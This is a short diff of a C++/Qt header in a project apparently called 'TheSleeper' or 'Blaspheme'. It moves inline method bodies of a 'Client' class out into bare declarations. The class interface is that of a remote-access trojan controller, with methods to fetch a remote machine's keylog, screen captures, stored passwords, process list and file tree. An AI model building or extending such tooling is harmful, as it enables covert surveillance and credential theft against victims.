@@ -26,32 +26,21 @@ namespace TheSleeper
 
         public:
         
-			Client(Blaspheme::Session _session, QObject * parent=0)
-				:session(_session), QObject(parent)
-			{
-				status = tr("Online");
-				updateClientName();
-				updateSystemVersion();
-				updatePasswords();
-				updateLogicalVolumes();
-			}
-
-            void addStream(Network::TcpClient new_stream){session.pushStream(new_stream);}
-			Blaspheme::SessionId getUniqueId(){return session.getId();}
-            QString getIp(){return session.stream().getIp().c_str();}
-            QString getPort(){return QString::number(session.stream().getPort());}
-            QString getStatus(){return status;}
-            QString getName(){return name;}
-            QString getSystemVersion(){return system_version;}
-
-            const QString& getKeylog(){return current_keylog;}
-            QPixmap& getScreen(){return screen;}
-
+			Client(Blaspheme::Session _session, QObject * parent=0);
+            void addStream(Network::TcpClient new_stream);
+			Blaspheme::SessionId getUniqueId();
+            QString getIp();
+            QString getPort();
+            QString getStatus();
+            QString getName();
+            QString getSystemVersion();
+            const QString& getKeylog();
+            QPixmap& getScreen();
             QString getRemoteSystemVersion();
-			QStringList& getProcessList(){return processes;}
+			QStringList& getProcessList();
             void updateScreen(int quality, QProgressBar * bar=0);
-            QStandardItemModel& getRemoteFileTree(){return remote_files;}
-	        QStringList& getStoredPasswords(){return stored_passwords;}
+            QStandardItemModel& getRemoteFileTree();
+	        QStringList& getStoredPasswords();
 			QAbstractTableModel& getTransfersTable();
             
             void updateProcessList();
